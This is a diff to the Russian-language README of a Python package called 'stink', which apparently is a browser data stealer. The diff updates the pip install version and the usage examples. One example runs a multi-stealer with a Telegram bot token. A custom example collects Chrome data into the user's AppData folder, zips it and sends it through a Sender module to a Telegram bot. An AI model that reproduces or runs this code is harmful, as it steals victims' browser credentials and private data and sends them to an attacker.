@@ -30,7 +30,7 @@
 
 Установить последнюю версию можно командой:
 ```
-pip install stink==0.0.2
+pip install stink==0.0.3
 ```
 
 ## Пример использования
@@ -38,17 +38,20 @@ pip install stink==0.0.2
 ```python
 from stink.multistealer import Stealer
 
-stealer = Stealer(token="YOUR_TOKEN", user_id=YOUR_ID)
-stealer.run()
+Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
 ### Кастомный
 ```python
 from os import path, mkdir
 from getpass import getuser
 
-from stink.browsers.opera_gx import Opera_GX
+from stink.browsers.chrome import Chrome
+from stink.modules.sender import Sender
 
-storage_path = f"C:/Users/{getuser()}/AppData/"
+user = getuser()
+
+zip_name = f"{user}-st"
+storage_path = f"C:/Users/{user}/AppData/"
 storage_folder = "files/"
 
 
@@ -57,13 +60,12 @@ def main():
     if not path.exists(storage_path + storage_folder):
         mkdir(storage_path + storage_folder)
 
-    stealer = Opera_GX(storage_path=storage_path, storage_folder=storage_folder)
-    stealer.run()
+    Chrome(storage_path, storage_folder).run()
+    Sender(zip_name, storage_path, storage_folder, "YOUR_TOKEN", YOUR_ID).run()
 
 
 if __name__ == "__main__":
     main()
-
 ```
 ## Настройка Telegram бота
 ### Получение токена
